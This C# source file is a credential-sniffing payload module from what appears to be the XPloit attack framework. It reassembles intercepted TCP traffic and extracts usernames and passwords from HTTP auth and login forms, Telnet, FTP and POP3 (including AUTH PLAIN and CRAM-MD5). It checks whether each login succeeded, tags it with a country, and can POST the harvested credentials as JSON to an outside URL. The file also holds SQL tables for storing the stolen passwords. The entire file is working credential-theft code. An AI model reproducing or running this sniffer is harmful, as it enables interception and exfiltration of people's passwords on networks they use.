using PacketDotNet;
using System.Dynamic;
using System.Text;
using XPloit.Core;
using XPloit.Helpers;
using XPloit.Helpers.Attributes;
using XPloit.Sniffer.Streams;
using System;
using XPloit.Sniffer.Enums;
using System.Collections.Generic;
using Xploit.Server.Http;
using System.IO;
using Xploit.Server.Http.Interfaces;
using Xploit.Server.Http.Enums;
using System.Collections;
using System.Linq;
using System.Net;
using Xploit.Helpers.Geolocate;
using System.Collections.Concurrent;

namespace XPloit.Modules.Payloads.Local.Sniffer
{
    public class GetCredentials : Payload, Auxiliary.Local.Sniffer.IPayloadSniffer
    {
        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Sniffer passwords"; } }
        #endregion

        #region Properties
        public bool CaptureOnTcpStream { get { return true; } }
        public bool CaptureOnPacket { get { return false; } }
        /*
CREATE TABLE `pass_ftp` (
  `DATE` datetime NOT NULL,
  `HOST` varchar(100) NOT NULL DEFAULT '',
  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
  `USER_HASH` char(40) NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(255) NOT NULL DEFAULT '',
  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `pass_pop3` (
  `DATE` datetime NOT NULL,
  `HOST` varchar(100) NOT NULL DEFAULT '',
  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
  `USER_HASH` char(40) NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(255) NOT NULL DEFAULT '',
  `AUTH_TYPE` varchar(20) NOT NULL DEFAULT '',
  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`,`AUTH_TYPE`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `pass_telnet` (
  `DATE` datetime NOT NULL,
  `HOST` varchar(100) NOT NULL DEFAULT '',
  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
  `USER_HASH` char(40) NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(255) NOT NULL DEFAULT '',
  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `pass_httpauth` (
  `DATE` datetime NOT NULL,
  `HOST` varchar(100) NOT NULL DEFAULT '',
  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
  `HTTP_HOST` varchar(100) NOT NULL DEFAULT '',
  `HTTP_URL` varchar(255) NOT NULL DEFAULT '',
  `USER_HASH` char(40) NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(255) NOT NULL DEFAULT '',
  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`HOST`,`PORT`,`HTTP_HOST`,`HTTP_URL`,`USER_HASH`,`VALID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `pass_http` (
  `DATE` datetime NOT NULL,
  `HOST` varchar(100) NOT NULL DEFAULT '',
  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
  `HTTP_HOST` varchar(100) NOT NULL DEFAULT '',
  `HTTP_URL` varchar(255) NOT NULL DEFAULT '',
  `USER_HASH` char(40) NOT NULL DEFAULT '',
  `USER` json NOT NULL,
  `PASS` json NOT NULL,
  `TYPE` varchar(10) NOT NULL DEFAULT '',
  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`HOST`,`PORT`,`HTTP_HOST`,`HTTP_URL`,`USER_HASH`,`TYPE`,`VALID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
        */
        [ConfigurableProperty(Description = "Http post url", Optional = true)]
        public Uri APIRestUrl { get; set; }

        [ConfigurableProperty(Description = "Write credentials as info")]
        public bool WriteAsInfo { get; set; }
        #endregion

        public bool Check() { return true; }
        public void OnPacket(IPProtocolType protocolType, IpPacket packet) { }

        ICheck[] _Checks = new ICheck[] { ExtractTelnet.Current, ExtractHttp.Current, ExtractFtpPop3.Current };
        public void OnTcpStream(TcpStream stream, bool isNew, ConcurrentQueue<object> queue)
        {
            if (stream == null || stream.Count == 0) return;

            if (stream.Variables == null)
            {
                stream.Variables = new ExpandoObject();
                stream.Variables.Valid = new bool[] { true, true, true };
            }

            // Check
            bool some = false;
            try
            {
                for (int x = stream.Variables.Valid.Length - 1; x >= 0; x--)
                {
                    if (!stream.Variables.Valid[x]) continue;

                    Credential[] cred;
                    switch (_Checks[x].Check(stream, out cred))
                    {
                        case EFound.DontRetry:
                            {
                                stream.Variables.Valid[x] = false;
                                break;
                            }
                        case EFound.Retry: some = true; break;
                        case EFound.True:
                            {
                                stream.Dispose();

                                foreach (Credential c in cred)
                                {
                                    // Prevent reiteration
                                    string json = c.ToString();
                                    string last;
                                    if (_LastCred.TryGetValue(c.Type, out last) && last == json)
                                        continue;

                                    _LastCred[c.Type] = json;
                                    queue.Enqueue(c);
                                }

                                return;
                            }
                    }
                }
            }
            catch (Exception e)
            {
                WriteError(e.ToString());
            }

            if (!some)
                stream.Dispose();
        }
        Dictionary<string, string> _LastCred = new Dictionary<string, string>();
        
        public void Dequeue(object o)
        {
            Credential c = (Credential)o;

            c.RecallCounty(GeoLite2LocationProvider.Current);
            string json = c.ToString();

            // Console
            if (WriteAsInfo)
            {
                if (c.IsValid) WriteInfo(json);
                else WriteError(json);
            }

            // ApiRest
            if (APIRestUrl != null)
            {
                //using (HttpClient client = new HttpClient() { })
                //{
                //    using (HttpResponseMessage response = await client.PostAsync(APIRestUrl, new StringContent(json, Encoding.UTF8, "application/json")))
                //    {
                //        using (HttpContent content = response.Content)
                //        {
                //            //string data = await content.ReadAsStringAsync();
                //        }
                //    }
                //}

                //t.RunSynchronously();
                using (WebClient client = new WebClient())
                {
                    client.Headers[HttpRequestHeader.ContentType] = "application/json";

                    string ret = client.UploadString(APIRestUrl, "POST", json);
                    int r;
                    if (!int.TryParse(ret, out r))
                    {

                    }
                }
            }
        }

        #region Extractors
        public enum EFound
        {
            True,
            Retry,
            DontRetry
        }
        public class Credential
        {
            IPAddress _Address;
            /// <summary>
            /// Date
            /// </summary>
            public string Date { get; private set; }
            /// <summary>
            /// Address
            /// </summary>
            public string Address { get { return _Address.ToString(); } }
            /// <summary>
            /// Country
            /// </summary>
            public string Country { get; private set; }
            /// <summary>
            /// Port
            /// </summary>
            public int Port { get; private set; }

            public Credential(DateTime date, IPEndPoint ip)
            {
                Date = date.ToString("yyyy-MM-dd HH:mm:ss");
                _Address = ip.Address;
                Port = ip.Port;
            }
            public bool RecallCounty(ILocationProvider provider)
            {
                if (provider != null)
                {
                    GeoLocateResult r = provider.LocateIp(_Address);
                    if (r != null)
                    {
                        Country = r.ISOCode;
                        return true;
                    }
                }
                return false;
            }

            /// <summary>
            /// Credential type
            /// </summary>
            public virtual string Type { get; }
            /// <summary>
            /// Is Valid
            /// </summary>
            public bool IsValid { get; set; }
            /// <summary>
            /// String representation
            /// </summary>
            public override string ToString()
            {
                return JsonHelper.Serialize(this, false, false);
            }
        }
        public interface ICheck
        {
            EFound Check(TcpStream stream, out Credential[] cred);
        }
        #endregion

        #region Extractors
        public class ExtractHttp : ICheck
        {
            static string[] UserWordList = new string[] {/* "u",*/ "login", "uid", "id", "userid", "user_id", "user", "uname", "username", "user_name", "usuario", "mail", "email", "name", "user_login", "email_login" };
            static string[] PasswordWordList = new string[] {/* "p",*/ "pass", "password", "key", "pwd", "clave", "hash", "password_login" };

            public class HttpCookieCredential : Credential
            {
                public HttpCookieCredential(DateTime date, IPEndPoint ip) : base(date, ip) { }
                public override string Type { get { return "HTTP-COOKIE"; } }
                /// <summary>
                /// Cookie
                /// </summary>
                public string Cookie { get; set; }
            }
            public class HttpCredential : Credential
            {
                string _Type;
                public HttpCredential(string type, DateTime date, IPEndPoint ip) : base(date, ip) { _Type = type; }
                public override string Type { get { return _Type; } }
                /// <summary>
                /// Host
                /// </summary>
                public string HttpHost { get; set; }
                /// <summary>
                /// Url
                /// </summary>
                public string HttpUrl { get; set; }
                /// <summary>
                /// User
                /// </summary>
                public string[] User { get; set; }
                /// <summary>
                /// Password
                /// </summary>
                public string[] Password { get; set; }
            }
            public class HttpAuthCredential : Credential
            {
                public HttpAuthCredential(DateTime date, IPEndPoint ip) : base(date, ip) { }
                public override string Type { get { return "HTTP-AUTH"; } }
                /// <summary>
                /// Host
                /// </summary>
                public string HttpHost { get; set; }
                /// <summary>
                /// Url
                /// </summary>
                public string HttpUrl { get; set; }
                /// <summary>
                /// User
                /// </summary>
                public string User { get; set; }
                /// <summary>
                /// Password
                /// </summary>
                public string Password { get; set; }
            }


            public enum EDic
            {
                User,
                Pass
            }

            static ICheck _Current = new ExtractHttp();
            public static ICheck Current { get { return _Current; } }

            class server : IHttpServer, IEnumerable<HttpRequest>, IDisposable
            {
                List<HttpRequest> _List = new List<HttpRequest>();
                public bool AllowKeepAlive { get { return true; } }
                public uint MaxPost { get { return uint.MaxValue; } }
                public uint MaxPostMultiPart { get { return uint.MaxValue; } }
                public bool ProgreesOnAllPost { get { return false; } }
                public bool SessionCheckFakeId { get { return false; } }
                public string SessionCookieName { get { return null; } }
                public string SessionDirectory { get { return null; } }
                public bool GetAndPostNamesToLowerCase { get { return true; } }

                IEnumerator IEnumerable.GetEnumerator() { return _List.GetEnumerator(); }
                public IEnumerator<HttpRequest> GetEnumerator() { return _List.GetEnumerator(); }

                public void OnPostProgress(HttpPostProgress post_pg, EHttpPostState start) { }
                public void OnRequest(HttpProcessor httpProcessor) { _List.Add(httpProcessor.Request); }
                public void OnRequestSocket(HttpProcessor httpProcessor) { }
                public bool PushAdd(HttpProcessor httpProcessor, string push_code) { return false; }
                public void PushDel(HttpProcessor httpProcessor, string push_code) { }

                public void Dispose() { _List.Clear(); }
            }

            public EFound Check(TcpStream stream, out Credential[] cred)
            {
                if (!stream.IsClossed)
                {
                    cred = null;
                    if (stream.FirstStream != null && stream.FirstStream.Emisor != ETcpEmisor.Client) return EFound.DontRetry;

                    if (stream.ClientLength > 30)
                    {
                        if (!stream.FirstStream.DataAscii.Contains(" HTTP/"))
                        {
                            if (!stream.FirstStream.DataAscii.StartsWith("GET ") &&
                                !stream.FirstStream.DataAscii.StartsWith("POST "))
                                return EFound.DontRetry;
                        }
                    }

                    return EFound.Retry;
                }

                if (stream.ClientLength < 30)
                {
                    cred = null;
                    return EFound.DontRetry;
                }

                List<Credential> ls = new List<Credential>();
                foreach (TcpStreamMessage pack in stream)
                    if (pack.Emisor == ETcpEmisor.Client)
                    {
                        if (!pack.DataAscii.Contains("Host: "))
                        {
                            cred = null;
                            return EFound.DontRetry;
                        }

                        using (server s = new server())
                        using (MemoryStream str = new MemoryStream(pack.Data))
                        using (HttpProcessor p = new HttpProcessor(stream.Destination.ToString(), str, s, true))
                        {
                            foreach (HttpRequest r in s)
                            {
                                string next = pack.Next == null ? null : pack.Next.DataAscii.Split('\n').FirstOrDefault();

                                bool valid = !string.IsNullOrEmpty(next) && next.Contains(" 200 ") && next.StartsWith("HTTP");

                                if (r.Autentication != null)
                                {
                                    ls.Add(new HttpAuthCredential(stream.StartDate, stream.Destination)
                                    {
                                        IsValid = valid,
                                        HttpHost = r.Host.ToString(),
                                        HttpUrl = r.Url,
                                        Password = r.Autentication.Password,
                                        User = r.Autentication.User
                                    });
                                }

                                if (r.Files.Length > 0)
                                {

                                }

                                for (int x = 0; x < 2; x++)
                                {
                                    Dictionary<string, string> d = x == 0 ? r.GET : r.POST;

                                    if (d.Count <= 0) continue;

                                    List<string> pwds = new List<string>();
                                    List<string> users = new List<string>();
                                    if (Fill(d, pwds, EDic.Pass) && Fill(d, users, EDic.User))
                                    {
                                        users.Sort();
                                        pwds.Sort();
                                        ls.Add(new HttpCredential((x == 0 ? "GET" : "POST"), stream.StartDate, stream.Destination)
                                        {
                                            IsValid = valid,
                                            HttpHost = r.Host.ToString(),
                                            HttpUrl = r.Url,
                                            User = users.Count == 0 ? null : users.ToArray(),
                                            Password = pwds.Count == 0 ? null : pwds.ToArray()
                                        });
                                    }
                                }

                                //List<string> sqli = new List<string>();
                                //if (sqli.Count >= 2)
                                //    ls.Add(new HttpPostCredential()
                                //    {
                                //        User = sqli.Count == 0 ? null : sqli.ToArray(),
                                //    });
                            }
                        }
                    }

                cred = ls.Count == 0 ? null : ls.ToArray();
                return cred == null ? EFound.DontRetry : EFound.True;
            }

            bool Exclude(string val, EDic dic)
            {
                if (string.IsNullOrEmpty(val)) return true;
                if (val.StartsWith("http://", StringComparison.InvariantCultureIgnoreCase)) return true;
                if (val.StartsWith("https://", StringComparison.InvariantCultureIgnoreCase)) return true;

                switch (dic)
                {
                    case EDic.User:
                        {
                            if (val.Length > 100) return true;
                            if (val == "0") return true;

                            break;
                        }
                    case EDic.Pass:
                        {
                            if (val.Length > 130) return true;
                            break;
                        }
                }
                return false;
            }

            public bool Fill(Dictionary<string, string> d, List<string> ls, EDic dic)
            {
                bool ret = false;
                string v;
                foreach (string su in dic == EDic.User ? UserWordList : PasswordWordList)
                    if (d.TryGetValue(su, out v) && !ls.Contains(v) && !Exclude(v, dic))
                    {
                        ls.Add(v);
                        ret = true;
                    }
                return ret;
            }
        }
        public class ExtractTelnet : ICheck
        {
            public class TelnetCredential : Credential
            {
                public TelnetCredential(DateTime date, IPEndPoint ip) : base(date, ip) { }
                public override string Type { get { return "TELNET"; } }
                /// <summary>
                /// User
                /// </summary>
                public string User { get; set; }
                /// <summary>
                /// Password
                /// </summary>
                public string Password { get; set; }
            }


            static ICheck _Current = new ExtractTelnet();
            public static ICheck Current { get { return _Current; } }

            List<string> _UserFields = new List<string>(new string[] { "user", "usuario" });
            List<string> _PasswordFields = new List<string>(new string[] { "pass", "key", "credential", "clave" });

            public string CleanTelnet(byte[] data, int index, int length)
            {
                for (int x = index, max = index + length; x < max; x++)
                {
                    if (data[x] == 0xff)
                    {
                        data[x] = 0x00;
                        if (x + 2 < max)
                        {
                            byte n = data[x + 1];
                            if (n >= 0xf0 && n <= 0xff)
                            {
                                data[x + 1] = 0x00;
                                data[x + 2] = 0x00;
                                x += 2;
                            }
                            else
                            {

                            }
                        }
                    }
                }

                string ret = Encoding.ASCII.GetString(data, index, length);
                return ret.Trim('\r', '\n', '\0');
            }
            public EFound Check(TcpStream stream, out Credential[] cred)
            {
                if (!stream.IsClossed)
                {
                    cred = null;
                    if (stream.FirstStream != null && stream.FirstStream.Emisor != ETcpEmisor.Server) return EFound.DontRetry;
                    return EFound.Retry;
                }

                if (stream.ClientLength < 1)
                {
                    cred = null;
                    return EFound.DontRetry;
                }

                bool isTelnet = false;
                string user = null, password = null;

                string nextIs = null;

                TelnetCredential last = null;
                List<TelnetCredential> ret = new List<TelnetCredential>();

                foreach (TcpStreamMessage pack in stream)
                {
                    switch (pack.Emisor)
                    {
                        case ETcpEmisor.Server:
                            {
                                string serverl = CleanTelnet(pack.Data, 0, pack.Data.Length).ToLowerInvariant();
                                if (string.IsNullOrEmpty(serverl))
                                {
                                    isTelnet = true;
                                    continue;
                                }

                                // Check
                                foreach (string uf in _UserFields) if (serverl.Contains(uf)) { nextIs = "user"; isTelnet = true; break; }
                                foreach (string uf in _PasswordFields) if (serverl.Contains(uf)) { nextIs = "pwd"; isTelnet = true; break; }
                                break;
                            }
                        case ETcpEmisor.Client:
                            {
                                if (!isTelnet)
                                {
                                    cred = null;
                                    return EFound.DontRetry;
                                }

                                string data = CleanTelnet(pack.Data, 0, pack.Data.Length);
                                if (string.IsNullOrEmpty(data)) continue;

                                switch (nextIs)
                                {
                                    case "user":
                                        {
                                            user = data;
                                            break;
                                        }
                                    case "pwd":
                                        {
                                            password = data;
                                            nextIs = "valid-check";

                                            last = new TelnetCredential(stream.StartDate, stream.Destination)
                                            {
                                                Password = password,
                                                User = user,
                                                IsValid = false
                                            };
                                            ret.Add(last);
                                            break;
                                        }
                                    case "valid-check":
                                        {
                                            if (last != null)
                                            {
                                                last.IsValid = true;
                                                cred = ret.Count == 0 ? null : ret.ToArray();
                                                return cred != null ? EFound.True : EFound.DontRetry;
                                            }
                                            break;
                                        }
                                }

                                break;
                            }
                        default:
                            {
                                cred = null;
                                return EFound.DontRetry;
                            }
                    }
                }

                if (!string.IsNullOrEmpty(user) && password == null)
                {
                    last = new TelnetCredential(stream.StartDate, stream.Destination)
                    {
                        Password = password,
                        User = user,
                        IsValid = false
                    };
                    ret.Add(last);
                }

                cred = ret.Count == 0 ? null : ret.ToArray();
                return cred != null ? EFound.True : EFound.DontRetry;
            }
        }
        public class ExtractFtpPop3 : ICheck
        {
            public class Pop3Credential : Credential
            {
                public Pop3Credential(DateTime date, IPEndPoint ip) : base(date, ip) { }
                public override string Type { get { return "POP3"; } }
                /// <summary>
                /// User
                /// </summary>
                public string User { get; set; }
                /// <summary>
                /// Password
                /// </summary>
                public string Password { get; set; }
                /// <summary>
                /// IsAPOP https://tools.ietf.org/html/rfc1939#page-15
                /// </summary>
                public string AuthType { get; set; }
            }
            public class FTPCredential : Credential
            {
                public FTPCredential(DateTime date, IPEndPoint ip) : base(date, ip) { }
                public override string Type { get { return "FTP"; } }
                /// <summary>
                /// User
                /// </summary>
                public string User { get; set; }
                /// <summary>
                /// Password
                /// </summary>
                public string Password { get; set; }
            }

            /*
    # FTP https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes

    ## OK ##

    S> 220-  ~~~ Welcome to OVH ~~~
    S> 220 This is a private system - No anonymous login
    C> USER miUser
    S> 331 User nabla OK. Password required
    C> PASS miPass
    S> 230 OK. Current restricted directory is /


    ## ERROR ##

    S> 220-  ~~~ Welcome to OVH ~~~
    S> 220 This is a private system - No anonymous login
    C> USER miUser
    S> 331 User nabla OK. Password required
    C> PASS miPass
    S> 530 Login authentication failed


    # POP3
    #https://tools.ietf.org/html/rfc1939#page-15


    S> +OK POP3 server ready <1896.697170952@dbc.mtview.ca.us>
    C> APOP mrose c4c9334bac560ecc979e58001b3e22fb
    S> +OK mrose's maildrop has 2 messages (320 octets)
    C> STAT


    S> +OK POP3 server ready <1896.697170952@dbc.mtview.ca.us>
    C> USER mrose
    S> +OK User accepted
    C> PASS tanstaaf
    S> +OK Pass accepted


    S> +OK POP3 server ready <1896.697170952@dbc.mtview.ca.us>
    C> USER mrose
    S> +OK User accepted
    C> PASS tanstaaf
    S> -ERR

         */
            static ICheck _Current = new ExtractFtpPop3();
            public static ICheck Current { get { return _Current; } }

            public EFound Check(TcpStream stream, out Credential[] cred)
            {
                if (stream.ClientLength < 1 || (stream.Count != 1 && stream.Count < 3) || stream.ServerLength < 4)
                {
                    cred = null;
                    if (stream.FirstStream != null && stream.FirstStream.Emisor != ETcpEmisor.Server) return EFound.DontRetry;
                    return EFound.Retry;
                }

                string pop3Type = null;
                bool isValidEnd = false;
                bool isValid = false, isPasswordFilled = false;
                bool isPop3 = false, isFtp = false;
                string user = null, password = null, challenge = null;

                foreach (TcpStreamMessage pack in stream)
                {
                    string sp = pack.DataAscii;

                    if (!isPop3 && !isFtp)
                    {
                        if (pack.Emisor != ETcpEmisor.Server)
                        {
                            cred = null;
                            return EFound.DontRetry;
                        }

                        // CHECK POP3
                        if (sp.StartsWith("+OK "))
                        {
                            isPop3 = true;
                            continue;
                        }
                        // Check FTP
                        int ix;
                        if (sp.Length >= 3 && int.TryParse(sp.Substring(0, 3), out ix) && ix >= 200 && ix <= 299)
                        {
                            isFtp = true;
                            continue;
                        }

                        cred = null;
                        return EFound.DontRetry;
                    }

                    if (pack.Emisor == ETcpEmisor.Client)
                    {
                        if (isPop3)
                        {
                            if (sp.StartsWith("APOP "))
                            {
                                pop3Type = "APOP";
                                user = sp.Substring(5).TrimEnd('\n', '\r');
                                int ix = user.IndexOf(' ');
                                if (ix != -1)
                                {
                                    password = user.Substring(ix + 1);
                                    user = user.Substring(0, ix);
                                    isPasswordFilled = true;
                                }
                                continue;
                            }
                        }

                        if (sp.StartsWith("USER ")) user = sp.Substring(5).TrimEnd('\n', '\r');
                        else if (sp.StartsWith("PASS "))
                        {
                            password = sp.Substring(5).TrimEnd('\n', '\r');
                            isPasswordFilled = true;
                        }
                        else
                        {
                            if (sp.StartsWith("STLS"))
                            {
                                cred = null;
                                return EFound.DontRetry;
                            }

                            if (isPop3)
                            {
                                if (sp.StartsWith("AUTH PLAIN")) pop3Type = "PLAIN";
                                else
                                {
                                    if (sp.StartsWith("AUTH CRAM-MD5")) pop3Type = "CRAM-MD5";
                                    else
                                    {
                                        if (password == null)
                                        {
                                            switch (pop3Type)
                                            {
                                                case "CRAM-MD5":
                                                    {
                                                        try
                                                        {
                                                            user = Encoding.ASCII.GetString(Convert.FromBase64String(sp.TrimEnd('\n', '\r'))).Trim('\0');
                                                            int ix = user.IndexOf(' ');
                                                            if (ix != -1)
                                                            {
                                                                password = user.Substring(ix + 1);
                                                                user = user.Substring(0, ix);
                                                                password += " [" + challenge + "]";
                                                                isPasswordFilled = true;
                                                            }
                                                        }
                                                        catch
                                                        {
                                                            cred = null;
                                                            return EFound.DontRetry;
                                                        }
                                                        break;
                                                    }
                                                case "PLAIN":
                                                    {
                                                        try
                                                        {
                                                            user = Encoding.ASCII.GetString(Convert.FromBase64String(sp.TrimEnd('\n', '\r'))).Trim('\0');
                                                            int ix = user.IndexOf('\0');
                                                            if (ix != -1)
                                                            {
                                                                password = user.Substring(ix + 1);
                                                                user = user.Substring(0, ix);
                                                                isPasswordFilled = true;
                                                            }
                                                        }
                                                        catch
                                                        {
                                                            cred = null;
                                                            return EFound.DontRetry;
                                                        }
                                                        break;
                                                    }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        if (isPasswordFilled)
                        {
                            if (isPop3)
                            {
                                isValid = sp.StartsWith("+OK ");
                            }
                            else
                            {
                                int ix;
                                if (sp.Length >= 3 && int.TryParse(sp.Substring(0, 3), out ix))
                                    isValid = (ix >= 200 && ix <= 299);
                            }

                            isValidEnd = true;
                            break;
                        }
                        else
                        {
                            if (isFtp)
                            {
                                int ix;
                                if (sp.Length >= 3 && int.TryParse(sp.Substring(0, 3), out ix))
                                    isValidEnd = (ix >= 500 && ix <= 599);
                            }
                            else
                            {
                                if (isPop3)
                                {
                                    if (pop3Type == "CRAM-MD5")
                                    {
                                        try
                                        {
                                            challenge = sp.TrimEnd('\n', '\r');
                                            int ix = challenge.IndexOf(' ');
                                            if (ix != -1)
                                            {
                                                challenge = challenge.Substring(ix + 1);
                                                //user = Encoding.ASCII.GetString(Convert.FromBase64String(challenge));
                                            }
                                        }
                                        catch
                                        {
                                            cred = null;
                                            return EFound.DontRetry;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                if (isValidEnd)
                {
                    if (isPop3)
                    {
                        cred = new Credential[] { new Pop3Credential(stream.StartDate,stream.Destination)
                        {
                            AuthType = pop3Type,
                            User = user,
                            Password = password,
                            IsValid = isValid
                        } };
                        return EFound.True;
                    }
                    else
                    {
                        if (isFtp)
                        {
                            cred = new Credential[] {new FTPCredential(stream.StartDate,stream.Destination)
                            {
                                User = user,
                                Password = password,
                                IsValid = isValid
                            } };
                            return EFound.True;
                        }
                        else cred = null;
                    }
                }
                else cred = null;

                return isPop3 || isFtp || stream.Count == 0 ? EFound.Retry : EFound.DontRetry;
            }
        }
        #endregion
    }
}